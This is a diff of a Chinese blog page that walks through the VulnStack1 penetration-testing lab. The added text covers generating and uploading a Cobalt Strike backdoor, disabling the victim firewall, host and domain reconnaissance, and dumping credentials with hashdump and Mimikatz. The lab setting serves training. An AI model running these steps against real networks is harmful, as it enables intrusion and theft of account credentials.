@@ -518,21 +518,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-08-04
+                    2020-08-05
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    6 分
                 </div>
                 
 				
@@ -581,20 +581,23 @@
 <li>IP：192.168.52.128</li>
 </ul>
 </li>
-<li><p>Web服务器：Windows7</p>
+<li><p>Web服务器：Windows7  </p>
 <ul>
 <li>外网IP：192.168.52.143   </li>
 <li>内网IP：192.168.72.128 </li>
+<li>主机名：stu1</li>
 </ul>
 </li>
 <li><p>域成员主机：Windows Server 2003</p>
 <ul>
 <li>IP：192.168.72.141       </li>
+<li>主机名：root-tvi862ubeh</li>
 </ul>
 </li>
 <li><p>域控服务器：Windows Server 2008</p>
 <ul>
-<li>IP：192.168.72.138             </li>
+<li>IP：192.168.72.138</li>
+<li>主机名：owa             </li>
 </ul>
 </li>
 </ul>
@@ -653,13 +656,13 @@
 <li><p><a href="https://soapffz.com/sec/496.html" target="_blank" rel="noopener">phpmyadmin 后台 getshell 及漏洞利用</a></p>
 </li>
 <li><p><a href="http://www.mamicode.com/info-detail-2599856.html" target="_blank" rel="noopener">网站后台getshell的方法总结</a></p>
-<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2></li>
+</li>
 </ul>
-<h3 id="反弹shell给Cobalt-Strike"><a href="#反弹shell给Cobalt-Strike" class="headerlink" title="反弹shell给Cobalt Strike"></a>反弹shell给Cobalt Strike</h3><p><strong>1.CS创建Listener</strong></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="反弹shell给Cobalt-Strike"><a href="#反弹shell给Cobalt-Strike" class="headerlink" title="反弹shell给Cobalt Strike"></a>反弹shell给Cobalt Strike</h3><p><strong>1.CS创建Listener</strong></p>
 <p>通过 <code>Cobalt Stike</code> → <code>Listeners</code> → <code>Add</code> 创建一个监听器</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200804163614.png" alt></p>
 <p><strong>2.生成后门文件</strong></p>
-<p><code>攻击</code> -&gt; <code>生成后门</code> -&gt; <code>Windows Executable(S)</code>，监听器选择刚创建的 <code>Listener</code>，输出选择<code>Windows EXE</code></p>
+<p><code>攻击</code>→<code>生成后门</code> → <code>Windows Executable(S)</code>，监听器选择刚创建的 <code>Listener</code>，输出选择<code>Windows EXE</code></p>
 <p><img src="../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/image-20200804165256799.png" alt></p>
 <p><strong>3.蚁剑上传后门</strong></p>
 <p>先关闭受害机防火墙</p>
@@ -684,36 +687,52 @@
 </tbody></table>
 <p>拿到 <code>shell</code> 第一步，调低心跳值，默认心跳为 <code>60s</code>，执行命令的响应很慢，进入 <code>beacon</code> 执行 <code>sleep 5</code> 或者右键主机选择 <code>会话</code> →<code>Sleep</code>进行设置</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200804172330.png" alt></p>
-<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>右键受害机选择<code>进入 beacon</code> 执行命令（执行cmd命令前面要加shell）</p>
+<h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p>右键受害机选择<code>进入 beacon</code> 执行命令（执行cmd命令前面要加shell）</p>
+<p><strong>查询基本信息</strong></p>
 <pre class="line-numbers language-bash"><code class="language-bash">shell <span class="token function">whoami</span>
 shell <span class="token function">hostname</span>
 net user     <span class="token comment" spellcheck="true"># 本机用户列表</span>
+net localgroup administrators    <span class="token comment" spellcheck="true"># 本机管理员[通常含有域用户]</span>
 shell ipconfig /all    <span class="token comment" spellcheck="true"># 查询本机IP段，所在域等</span>
-shell systeminfo
-net localhroup administrators    本机管理员<span class="token punctuation">[</span>通常含有域用户<span class="token punctuation">]</span>
+shell systeminfo <span class="token comment" spellcheck="true">#查看系统详细信息</span>
 <span class="token function">nslookup</span> god.org    <span class="token comment" spellcheck="true"># 解析域名IP地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200804173824.png" alt></p>
-<p>查询操作系统信息</p>
+<p><strong>查询操作系统信息</strong></p>
 <pre class="line-numbers language-bash"><code class="language-bash">shell systeminfo <span class="token operator">|</span> findstr /B /C:<span class="token string">"OS Name"</span> /C:<span class="token string">"OS Version"</span>  <span class="token comment" spellcheck="true"># 英文操作系统</span>
 shell systeminfo <span class="token operator">|</span> findstr /B /C:<span class="token string">"OS 名称"</span> /C:<span class="token string">"OS 版本"</span>   <span class="token comment" spellcheck="true"># 中文操作系统</span>
 shell <span class="token keyword">echo</span> %PROCESSOR_ARCHITECTURE%    <span class="token comment" spellcheck="true"># 查看系统系统结构</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>查看安装的软件以及版本、路径信息</p>
+<p><strong>查询已安装的软件以及版本信息</strong></p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 使用wmic操作</span>
-wmic product get name,version 
+shell wmic product get name,version 
 
 <span class="token comment" spellcheck="true">#使用powershell进行操作</span>
 powershell <span class="token string">"Get-WmiObject -class Win32_Product | Select-Object -Property name,Version"</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>查找域内信息</p>
-<pre class="line-numbers language-bash"><code class="language-bash">net user /domain    <span class="token comment" spellcheck="true"># 查询域用户</span>
+<p><strong>查询进程及服务</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash">shell tasklist <span class="token comment" spellcheck="true"># 默认显示映像名称，PID，会话名，会话，内存使用</span>
+shell tasklist /svc <span class="token comment" spellcheck="true"># 默认显示映像名称，PID，服务</span>
+shell wmic process list brief <span class="token comment" spellcheck="true"># 列出进程的核心信息,类似任务管理器</span>
+net statistics workstation     <span class="token comment" spellcheck="true"># 查看主机开机时间</span>
+<span class="token function">netstat</span> -ano    <span class="token comment" spellcheck="true">#查询端口列表</span>
+wmic qfe get caption,description,hotfixid,installedon   <span class="token comment" spellcheck="true">#查询本机安装的补丁</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><pre class="line-numbers language-bash"><code class="language-bash">net user /domain    <span class="token comment" spellcheck="true"># 查询域用户</span>
 net view /domain   <span class="token comment" spellcheck="true"># 查看域</span>
 net <span class="token function">time</span> /domain  <span class="token comment" spellcheck="true"># 获取域服务器的时间</span>
-net config workstation  <span class="token comment" spellcheck="true"># 查询当前登陆域及登陆用户信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="横向探测"><a href="#横向探测" class="headerlink" title="横向探测"></a>横向探测</h3><p>读内存密码</p>
-<pre class="line-numbers language-bash"><code class="language-bash">hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>利用 <code>mimitakz</code> 模块（实战中需要免杀处理），读注册表密码</p>
-<pre class="line-numbers language-bash"><code class="language-bash">logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+net group <span class="token string">"domain computers"</span> /domain         <span class="token comment" spellcheck="true">#查看域内所有的主机名</span>
+net group <span class="token string">"domain admins"</span>   /domain          <span class="token comment" spellcheck="true">#查看域管理员</span>
+net group <span class="token string">"domain controllers"</span> /domain       <span class="token comment" spellcheck="true">#查看域控</span>
+shell net config workstation  <span class="token comment" spellcheck="true"># 查询当前登陆域及当前计算机名，全名，用户名，系统版本，工作站域</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="横向探测"><a href="#横向探测" class="headerlink" title="横向探测"></a>横向探测</h3><h4 id="凭据导出"><a href="#凭据导出" class="headerlink" title="凭据导出"></a>凭据导出</h4><blockquote>
+<p>凭据可以理解为目标机的账号，密码。凭据导出是渗透测试中极为重要的步骤，导出目标机凭据后，我们可以使用凭据实现横向移动（利用hash传递，smb/rdp爆破等等手法）来扩大我们的战果。</p>
+</blockquote>
+<h5 id="hashdump读内存密码"><a href="#hashdump读内存密码" class="headerlink" title="hashdump读内存密码"></a><strong>hashdump读内存密码</strong></h5><pre class="line-numbers language-bash"><code class="language-bash">beacon<span class="token operator">></span> hashdump
+或者
+右键点击beacon会话→执行→转储Hash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h5 id="Mimikatz导出凭据"><a href="#Mimikatz导出凭据" class="headerlink" title="Mimikatz导出凭据"></a><strong>Mimikatz导出凭据</strong></h5><p>利用 <code>mimitakz</code> 模块（实战中需要免杀处理），读注册表密码</p>
+<pre class="line-numbers language-bash"><code class="language-bash">beacon<span class="token operator">></span> logonpasswords
+或者
+右键点击主机→执行→Run Mimikatz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200804182058.png" alt></p>
-<p>点击<code>凭证信息</code>可以查看读取到的密码</p>
+<h5 id="凭据存储"><a href="#凭据存储" class="headerlink" title="凭据存储"></a><strong>凭据存储</strong></h5><p>点击<code>凭证信息</code>可以查看读取到的密码</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200804182054.png" alt></p>
 <p><strong>参考：</strong></p>
 <ul>
@@ -1516,7 +1535,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">177.9k</span>&nbsp;字
+                class="white-color">178.4k</span>&nbsp;字
             
             
             
